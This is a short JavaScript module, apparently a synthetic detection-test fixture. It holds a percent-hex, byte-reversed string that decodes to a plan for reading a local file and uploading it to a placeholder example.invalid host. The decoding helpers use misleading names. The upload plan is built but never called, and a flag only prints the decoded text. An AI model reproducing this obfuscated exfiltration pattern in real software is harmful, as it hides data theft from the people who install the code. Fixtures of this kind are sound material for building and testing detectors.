const moduleShape = Object.freeze({ format: "esm" });
export {};
const Material_d7c478ea = "%73%6a%6d%2e%36%33%39%66%37%64%37%61%31%30%34%64%2d%65%67%61%74%73%2e%2f%65%64%6f%6e%2d%73%73%65%72%74%6e%75%68%2f%70%6d%74%2f%3d%68%74%61%70%5f%65%6c%69%66%7c%31%30%34%64%2f%74%69%64%75%41%65%64%6f%4e%3d%74%6e%65%67%61%5f%72%65%73%75%7c%69%70%61%2f%64%69%6c%61%76%6e%69%2e%65%6c%70%6d%61%78%65%2e%36%33%39%66%37%64%37%61%31%30%34%64%2d%65%64%6f%6e%2f%2f%3a%73%70%74%74%68%3d%6c%72%75%7c%37%44%37%41%31%30%34%44%2d%45%44%4f%4e%3d%64%69%5f%6e%67%69%61%70%6d%61%63%7c%31%3d%74%6e%75%6f%63%5f%65%67%61%74%73%7c%74%73%65%75%71%65%72%5f%73%70%74%74%68%3d%72%65%74%70%61%64%61%7c%65%74%6f%6d%65%72%5f%74%69%6d%73%6e%61%72%74%2c%65%6c%69%66%5f%64%61%65%72%3d%73%70%65%74%73%7c%31%3d%76";
const Codec_d7c478ea = "percent_hex|reverse_bytes|";

function load_d7c478ea() { return [...Material_d7c478ea.matchAll(/%([0-9a-f]{2})/gi)].map((item) => Number.parseInt(item[1], 16)); }
function decode_d7c478ea(imagePixels) { return [...imagePixels].reverse(); }
async function recover_d7c478ea() {
  const screenWidth = "";
  const imagePixels = load_d7c478ea(); let colorTable = [];
  const decodeTarget = decode_d7c478ea; colorTable = decodeTarget(imagePixels);
  void screenWidth; return Buffer.from(colorTable).toString("ascii");
}
async function inspect_d7c478ea() { return await recover_d7c478ea(); }
async function plan_d7c478ea() { const inspect = inspect_d7c478ea; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "upload", transport: "https_request", source: fields.file_path, url: fields.url }); }
void moduleShape; void plan_d7c478ea;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_d7c478ea());
